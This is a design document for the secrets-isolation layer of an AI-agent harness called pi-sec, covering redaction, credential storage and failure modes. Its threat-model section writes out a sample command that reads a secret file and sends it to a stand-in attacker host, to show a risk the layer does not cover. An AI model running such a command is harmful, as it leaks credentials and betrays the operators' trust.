# Secrets Isolation

Companion to [README.md](./README.md). This is a core guarantee of `pi-sec`:
**credential and permission tokens never enter model context, and redaction is
irreversible.**

The boundary is installed by the bundled **`secrets` extension**, enabled by
default and disableable like any other extension (not recommended). When enabled,
the fail-closed store behavior in §9 applies.

---

## 1. The guarantee

The model may *use* a secret, but it may never *see* one, and it can never
recover a redacted value. Secrets are replaced by fixed dummy tokens in
everything the model reads. The dummy carries no information and is **not**
converted back by `pi-sec`. To use a secret, the model writes a **script** that
reads the secret from its file at execution time; the model itself only ever
handles the script, never the value.

Length is not preserved: for a given secret name, a 64-byte and a 20-byte value
produce the same dummy, so the model cannot infer a value's size (the dummy does
embed the non-secret name).

---

## 2. Secret storage

Secrets live as files under `~/.pi/sec/secrets/`, readable by the `pi-sec`
user (0600). One file per secret, named by a stable identifier:

```
~/.pi/sec/secrets/
  gh_token
  smtp_password
  api_key_example
  env                          # optional: `KEY=value` lines for `set -a; . env; set +a`
  model-auth.deepseek.key      # written by pi-sec for its own model credentials
```

`env` is parsed line by line and **each value is registered individually**; the
key becomes the secret name. The file's raw contents are never registered as a
single secret.

- **Names are not secret.** The model is told the names and the directory. Names
  may appear in context.
- **Values are secret.** Values are loaded into an in-process registry at
  startup (and on change) and used only to build the redaction matcher. They are
  never written to conversation state, documents, logs, or model context.
- The store is the source of truth for scripts: a generated script can do
  `TOKEN=$(cat ~/.pi/sec/secrets/gh_token)` or source the `env` file. This is the
  **only** supported way for the agent to use a secret.

### Writing a secret from the web UI

`POST /api/admin/secrets/write` writes one secret file. The request carries a
JSON body `{name, text}`:

```
curl -X POST http://127.0.0.1:8787/api/admin/secrets/write \
  -H 'Content-Type: application/json' \
  -d '{"name":"gh_token","text":"ghp_..."}'
```

- **Content type.** The route requires `application/json` and answers 415
  `json_required` otherwise. A cross-site form can POST without a preflight, and
  a form cannot send that type.
- **Name.** The name must match `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`, must not be
  `env`, and must not end with a dot. A name that fails answers 400
  `invalid_name`. Names are case-sensitive.
- **Text.** An empty text answers 400 `empty_secret`. A text that holds only
  whitespace is refused the same way, because a stored value of one newline
  would be redacted out of every line. A body larger than `server.maxBodyBytes`
  (1 MiB by default) answers 413.
- **No overwrite.** A name that already exists answers 409 `name_exists`, and the
  existing file keeps its bytes. The write creates a temporary
  `<dir>/.upload-<id>` file, syncs it, and links it to the final name; the link
  fails instead of replacing the file.
- **Permissions.** The final file is the temporary file's inode, at mode 0600,
  in a directory at 0700. No separate `chmod` step exists.
- **Reload.** The route reloads the registry before it answers, so redaction
  covers the new value from the next request on. A reload that fails answers 500
  `write_failed`.
- **No value out.** The response carries `{ok:true,name,bytes}`. The audit row
  carries the name and the byte count, never the value and never a hash of it.
  No error sentence quotes the name or the text.
- **Temporary files.** A `.upload-` file left by a crashed write stays in the
  directory. The next write removes the ones older than an hour.

### Model credentials and API keys (automatic)

`pi-sec`'s own model credentials are secrets too, so their values live in the
same directory as every other secret:

```
~/.pi/sec/secrets/
  model-auth.deepseek.key        # the API key of provider `deepseek`
  model-auth.anthropic.access    # an OAuth access token of `anthropic`
  model-auth.anthropic.refresh   # its refresh token
```

The file name is `model-auth.<provider>.<field>`, the file holds the value and
nothing else, and the file is 0600. `~/.pi/sec/auth.json` holds the shape of the
credential and a reference to that file instead of the value:

```json
{
  "deepseek": {
    "type": "api_key",
    "key": { "file": "model-auth.deepseek.key" }
  }
}
```

The remaining fields of a credential (its type, an expiry, a scope) are not
secret and stay in `auth.json`.

- The registry registers the content of each `model-auth.*` file under the file
  name, so the value is redacted and the name is not. A reference is a file
  name, and it is not registered as a value.
- Reading `~/.pi/sec/auth.json` through a tool shows a reference. Reading the
  secret file shows a placeholder, so the agent still cannot see the value.
- Values under sensitive keys (`apiKey`, `api_key`, `token`, `secret`,
  `password`, `authorization`, `bearer`) that `~/.pi/sec/models.json` holds are
  collected from that file the same way.
- This is on by default (`secrets.includeModelCredentials`). Disabling it leaves
  those credentials unredacted, which is not recommended.

#### The one-time move at daemon start

An `auth.json` written by an older version holds the values inline. On start,
before the secret store loads, the daemon moves them once:

1. It copies `auth.json` to `auth.json.bak-<YYYYMMDD>-model-auth` (0600).
2. It writes each value to `secrets/model-auth.<provider>.<field>` (0600) through
   a temporary file and a rename.
3. It rewrites `auth.json` with references, through a temporary file and a
   rename.

The rewrite of `auth.json` is the last step, so a crash leaves the values inline
and the next start tries again. A secret file of the same name that already
holds a different value stops the move before anything is written: `auth.json`
stays as it was, the daemon runs on the inline values, and an update keeps the
clashing field inline.

#### Refresh and login

An OAuth refresh writes a value the same way: a temporary file and a rename in
the secret directory, then `auth.json`. A refresh writes the refresh token first,
then the access token, then `auth.json`, because the provider kills a rotated
refresh token at once. The daemon re-reads the secret list after the write, so
the new value is redacted from the next request on.

Sign a model provider in from the web UI: open "Model login" in the
"More actions" menu, choose the provider and the login type, and answer what
the panel asks. For an OAuth login, open the sign-in link, sign in, and paste
the code that the provider shows into the panel. The daemon writes the
credential to the secret store, keeps only references in `auth.json`, and uses
the credential from the next request. The daemon does not restart.

After a login succeeds, the daemon writes the login time and the login type to
`state/model-logins.json`, one entry per provider. Every login session also
appends one `model_login` row to the audit log, with the provider, the type and
the outcome. The file holds no credential value. If the file cannot be written,
the login still succeeds and the panel shows a warning.

If the proxy is down, open an SSH tunnel whose local port is the daemon's port,
and use the panel at `http://127.0.0.1:<port>/`. If the page itself does not
work, send the same requests with `curl` on the host, as described in the
model login section of [http-api.md](./http-api.md). Read the pasted code with
`read -r` so that it does not stay in the shell history.

A credential that another process writes reaches the daemon too, which is why a
credential file edited by hand takes effect without a restart. The credential
store reads the values on every request and keeps a digest of them. A read that
finds a different digest reloads the secret list before it returns the value, so
the new value is redacted from the first request that uses it.

#### Rollback

`user-tools/model-auth-restore-plain` rebuilds `auth.json` with inline values,
read from the secret files that `auth.json` names. Run it as the `pi-sec` user
while the daemon is stopped, and type `restore` at its prompt. It copies
`auth.json` to `auth.json.bak-<YYYYMMDD-HHMMSS>-before-restore` (0600) first, and
deletes that copy when the rewrite succeeds. A rewrite that fails keeps the copy
and prints where it is. It prints no value, and leaves the secret files in place.
If `config.json` moves `secrets.dir`, pass that directory in
`PI_SEC_SECRETS_DIR`.

---

## 3. The registry

`src/secrets/registry.ts` holds the in-memory view used for redaction:

```ts
type Registry = {
  load(): Promise<void>;                 // ~/.pi/sec/secrets/ + ~/.pi/sec/auth.json + models.json
  dummyOf(value: string): string | undefined;
  has(value: string): boolean;
  names(): string[];
};
```

- **Dummy format**: `⟦secret:{name}⟧` by default (configurable). Fixed width for
  the format; the width varies with the *name*, never the value.
- **Longest-first matching** so overlapping values do not partially replace.
- **Unreadable/inconsistent store**: **fail closed.** If the store exists but
  cannot be read, parsed, or verified, `pi-sec` refuses to start. If it becomes
  unreadable at runtime, every model and tool request is refused until it is
  restored. It never runs with a partial or empty registry while secret files
  exist.
- The registry is refreshed on file change and snapshotted per request so a run
  sees a consistent view.

---

## 4. One-way redaction

`src/secrets/redact.ts` exposes a single function:

```ts
redact(text: string): string;   // real values -> dummies (toward the model)
```

There is **no `resolve()`**. A dummy that appears in a tool argument is passed
literally to the tool; `pi-sec` never substitutes a value back. The system prompt
tells the model not to pass dummies to tools. Instead the model generates a script
that reads from `~/.pi/sec/secrets/`.

```
   tool results · user input · fetched text          system prompt · memory
   · memory notes · documents · sections                   · documents
                    │                                         │
                    ▼ redact                                  ▼ redact
            ┌───────────────────────────────────────────────────────┐
            │                    model context                      │
            │              dummies only, no values                  │
            └───────────────────────────────────────────────────────┘
                    │
                    ▼
            model writes a script, e.g.
              TOKEN=$(cat ~/.pi/sec/secrets/gh_token)
              curl -H "Authorization: Bearer $TOKEN" …
                    │
                    ▼
            ┌───────────────────────────────────────────────────────┐
            │                execution (real value)                 │
            │   output that echoes the value is redacted on return  │
            └───────────────────────────────────────────────────────┘
```

### Where redaction is applied

Redaction happens when content enters the conversation history: a committed entry
is stored already redacted. It also happens again once per request. The
`GenerationTask` `beforeRequest` hook maps every message of the request through
the redactor, so the whole history is rescanned each time the model is called.

- **ExecutionEnv wrapper** — `readTextFile`, `exec` output, directory listings,
  and line readers are redacted before their results are committed. Primary
  chokepoint for built-in tools.
- **`ToolTask` `afterTool` hook** — redacts the final result of any tool that does
  not go through the env (e.g. `web`).
- **User input and documents** — redacted when the entry is written.
- **Logger and audit** — redacted before serialization.
- **`GenerationTask` `beforeRequest` hook** — redacts every message of every
  request, so a value that is already in the history is masked again on each call.
  The cost is one pass over the messages per request, and the gain is that a value
  which matches a secret registered later is masked from the next request on.

No hook resolves dummies. `beforeTool` does **not** rewrite arguments.

Because the history is rescanned on every request, a secret registered *after* its
value was committed is masked from the next request onward. Its value still sits
in the stored entry, so a database dump or a fork of the conversation can still
hold it. The registry loads before the harness opens, and the user registers a
secret before it is used.

---

## 5. Why scripts, not substitution

- **No round trip = no leak path.** If `pi-sec` resolved dummies, a compromised
  or confused model could place a dummy into any tool argument and cause the real
  value to be materialized as a side effect. Removing resolution removes that
  class entirely.
- **Irreversibility is simple to reason about.** A value that reaches model
  context is gone from the model's perspective forever. There is no "recover
  secret" operation to audit or abuse.
- **Scripts are the natural interface** for an agent with shell access: read the
  file, use the variable, let the output be redacted. The model gets utility
  without custody.

---

## 6. Encoded variants

A command may emit a secret in a transformed form (`base64`, percent-encoding).
The registry therefore registers these variants for each value and redacts them
too:

- raw
- base64 (standard and URL-safe, with/without padding)
- percent-encoded

Arbitrary encodings (hex dumps, compression, hashes) are not covered — they are
either non-recoverable or outside the model. The system prompt tells the model not
to transform secrets.

---

## 7. Streaming and chunk boundaries

Tool output is committed in intervals and streamed to clients. A secret can be
split across two output chunks, so redaction uses a sliding window: hold back the
last `maxVariantLength - 1` characters until the next chunk or stream end, then
redact and emit. The env wrapper and the `afterTool` hook both apply the window,
so committed `pi.live` partials and stored entries never contain a real value.

---

## 8. The system-prompt section

A stable section (from the `secrets` extension) explains:

```
- Secrets are stored as files under ~/.pi/sec/secrets/<name> and are redacted
  from everything you read. The redaction is irreversible; you can never see or
  recover a value.
- To use a secret, write a command or script that reads the file yourself, e.g.:
      TOKEN=$(cat ~/.pi/sec/secrets/gh_token)
      curl -H "Authorization: Bearer $TOKEN" https://api.github.com/user
- Do not pass a placeholder such as ⟦secret:gh_token⟧ as a value; it is not
  resolved. Read the file instead.
- Output you produce that contains a secret will be redacted before you see it
  again, so printing it is useless.
- Available secret names: <list>
```

Listing **names** is safe and improves usability. Values are never listed.

---

## 9. Failure modes

| Situation | Behavior |
|-----------|----------|
| Secret store unreadable/inconsistent | **Fail closed**: refuse to start, or refuse all model/tool work if it fails at runtime. Never a partial registry. |
| `env` line malformed | That line is rejected with a warning; the rest load. |
| `auth.json` is not valid JSON | **Fail closed**: refuse to start. The sentence names the path and says the file is not valid JSON, and never quotes the text. |
| A secret file of a model credential holds another value | The one-time move changes nothing and the daemon runs on the inline values; an update keeps that field inline. |
| A genuine value appears unencoded in output | Redacted. |
| A novel encoding appears in output | Possibly not redacted; residual risk. Add the encoding if relevant. |
| Model passes a dummy as a tool value | Passed literally; the tool may fail. The prompt tells the model to read the file instead. |
| Registry reload during an in-flight run | Immutable per-request snapshot keeps the run consistent. |

---

## 10. Threat model and residual risk

**Protected:** secret values cannot be read out of model context, logs, documents,
memory, or streamed partials. Because there is no resolution step, a model cannot
materialize a secret by referencing it.

**Not protected:** the model can write a script that reads a secret file and
exfiltrates it (`curl https://attacker.example/?x=$(cat ~/.pi/sec/secrets/token)`).
Secret isolation keeps values out of context; it is not an egress firewall.
Mitigations:

- Secrets should be scoped and short-lived where possible.
- If egress control is needed, enforce it at the host firewall or an HTTP proxy
  (see [security.md](./security.md#network)); this is deliberately not an
  in-process text-rule guard.
- Secret file access is not audited. The audit log records a secret written
  through the HTTP route (`secret.write`, with the name and the byte count), and
  it records no read. A read leaves a trace only in the tool call and its output.

The promise is: **secrets never enter model context, and redaction is
irreversible.** It is not: secrets can never be misused.
